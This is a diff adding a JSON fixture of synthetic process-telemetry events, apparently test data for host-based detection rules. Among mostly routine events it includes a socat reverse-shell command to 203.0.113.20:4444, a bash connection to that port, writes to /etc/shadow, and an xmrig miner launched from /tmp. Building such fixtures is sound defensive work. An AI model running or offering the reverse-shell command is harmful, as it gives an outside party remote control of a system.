@@ -1,0 +1,120 @@
+[
+  {
+    "event_id": "evt-rule-001",
+    "timestamp": "2026-06-02T11:00:01Z",
+    "host": "devbox-01",
+    "pid": 5001,
+    "ppid": 5000,
+    "uid": 0,
+    "process_name": "sh",
+    "parent_process_name": "apt-get",
+    "event_type": "execve",
+    "executable_path": "/usr/bin/dash",
+    "command_line": ["sh", "-c", "post-install"],
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-002",
+    "timestamp": "2026-06-02T11:00:02Z",
+    "host": "devbox-01",
+    "pid": 5101,
+    "ppid": 5100,
+    "uid": 1000,
+    "process_name": "bash",
+    "parent_process_name": "sshd",
+    "event_type": "execve",
+    "executable_path": "/usr/bin/bash",
+    "command_line": ["bash"],
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-003",
+    "timestamp": "2026-06-02T11:00:03Z",
+    "host": "devbox-01",
+    "pid": 5101,
+    "ppid": 5100,
+    "uid": 1000,
+    "process_name": "bash",
+    "parent_process_name": "sshd",
+    "event_type": "connect",
+    "executable_path": "/usr/bin/bash",
+    "remote_addr": "203.0.113.20",
+    "remote_port": 4444,
+    "metadata": {
+      "protocol": "tcp"
+    }
+  },
+  {
+    "event_id": "evt-rule-004",
+    "timestamp": "2026-06-02T11:00:04Z",
+    "host": "devbox-01",
+    "pid": 5201,
+    "ppid": 5200,
+    "uid": 0,
+    "process_name": "sed",
+    "parent_process_name": "sh",
+    "event_type": "file_write",
+    "executable_path": "/usr/bin/sed",
+    "file_path": "/etc/shadow",
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-005",
+    "timestamp": "2026-06-02T11:00:05Z",
+    "host": "devbox-01",
+    "pid": 5201,
+    "ppid": 5200,
+    "uid": 0,
+    "process_name": "sed",
+    "parent_process_name": "sh",
+    "event_type": "file_write",
+    "executable_path": "/usr/bin/sed",
+    "file_path": "/etc/shadow",
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-006",
+    "timestamp": "2026-06-02T11:00:06Z",
+    "host": "devbox-01",
+    "pid": 5301,
+    "ppid": 5300,
+    "uid": 1000,
+    "process_name": "xmrig",
+    "parent_process_name": "sh",
+    "event_type": "execve",
+    "executable_path": "/tmp/xmrig",
+    "command_line": ["/tmp/xmrig"],
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-007",
+    "timestamp": "2026-06-02T11:00:07Z",
+    "host": "devbox-01",
+    "pid": 5401,
+    "ppid": 5400,
+    "uid": 1000,
+    "process_name": "socat",
+    "parent_process_name": "bash",
+    "event_type": "execve",
+    "executable_path": "/usr/bin/socat",
+    "command_line": ["socat", "TCP:203.0.113.20:4444", "EXEC:/bin/sh"],
+    "metadata": {}
+  },
+  {
+    "event_id": "evt-rule-008",
+    "timestamp": "2026-06-02T11:00:08Z",
+    "host": "devbox-01",
+    "pid": 5001,
+    "ppid": 5000,
+    "uid": 0,
+    "process_name": "sh",
+    "parent_process_name": "apt-get",
+    "event_type": "connect",
+    "executable_path": "/usr/bin/dash",
+    "remote_addr": "203.0.113.30",
+    "remote_port": 443,
+    "metadata": {
+      "protocol": "tcp"
+    }
+  }
+]
